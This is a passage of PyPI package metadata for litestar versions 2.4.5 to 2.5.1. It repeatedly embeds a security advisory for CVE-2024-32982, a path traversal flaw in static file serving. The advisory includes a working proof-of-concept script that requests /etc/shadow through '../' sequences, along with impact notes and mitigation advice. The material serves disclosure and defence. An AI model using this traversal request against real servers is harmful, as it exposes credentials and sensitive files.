scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.4.5":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.4.5/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.4.5","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"9c657d261588b2a178d8ee4f33c356f8bb06818179ebe36c475a7402b8074a14","md5":"02050b2cd372168e52f1826dbe403678","sha256":"fc4870c3052c4d95626278d127b44c3c912f293915dee08d57d94f33edb13265"},"downloads":-1,"filename":"litestar-2.4.5-py3-none-any.whl","has_sig":false,"md5_digest":"02050b2cd372168e52f1826dbe403678","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":491988,"upload_time":"2023-12-23T14:55:30","upload_time_iso_8601":"2023-12-23T14:55:30.409318Z","url":"https://files.pythonhosted.org/packages/9c/65/7d261588b2a178d8ee4f33c356f8bb06818179ebe36c475a7402b8074a14/litestar-2.4.5-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"b333a8aa445efe563a89a7c0db06d6175c7eae146aba0556a4bd54b53d6f1f38","md5":"bfdf2707e14d308e7ee9fe2b33db1990","sha256":"f758aa69421eacce1b394ab924ae4d433b8c1bfda181d0b112531e09d773038f"},"downloads":-1,"filename":"litestar-2.4.5.tar.gz","has_sig":false,"md5_digest":"bfdf2707e14d308e7ee9fe2b33db1990","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":630833,"upload_time":"2023-12-23T14:55:32","upload_time_iso_8601":"2023-12-23T14:55:32.088031Z","url":"https://files.pythonhosted.org/packages/b3/33/a8aa445efe563a89a7c0db06d6175c7eae146aba0556a4bd54b53d6f1f38/litestar-2.4.5.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.5.0":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.5.0/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.5.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"52468f42116f5747a7e0ad45355e7ba2c9615fa4009cb32225b9d08a6ee6bd57","md5":"cd746121eaaed1490f3d7df754714988","sha256":"dc684d751712c852c3594582c74201f106b6806f721f5d0a0f317b8f0e4b35fd"},"downloads":-1,"filename":"litestar-2.5.0-py3-none-any.whl","has_sig":false,"md5_digest":"cd746121eaaed1490f3d7df754714988","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":497389,"upload_time":"2024-01-06T11:46:23","upload_time_iso_8601":"2024-01-06T11:46:23.767462Z","url":"https://files.pythonhosted.org/packages/52/46/8f42116f5747a7e0ad45355e7ba2c9615fa4009cb32225b9d08a6ee6bd57/litestar-2.5.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"fc31f738550f0184e478029114e30207b4718218d75ad8fd22f60209008fe8d9","md5":"b1fa9467c2961cc8785296e3f51f34e7","sha256":"b88780d538a387dab4e02a94de2089822d829dba6a0666abc37593b07d479e00"},"downloads":-1,"filename":"litestar-2.5.0.tar.gz","has_sig":false,"md5_digest":"b1fa9467c2961cc8785296e3f51f34e7","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":637808,"upload_time":"2024-01-06T11:46:26","upload_time_iso_8601":"2024-01-06T11:46:26.437078Z","url":"https://files.pythonhosted.org/packages/fc/31/f738550f0184e478029114e30207b4718218d75ad8fd22f60209008fe8d9/litestar-2.5.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.5.1":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.5.1/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 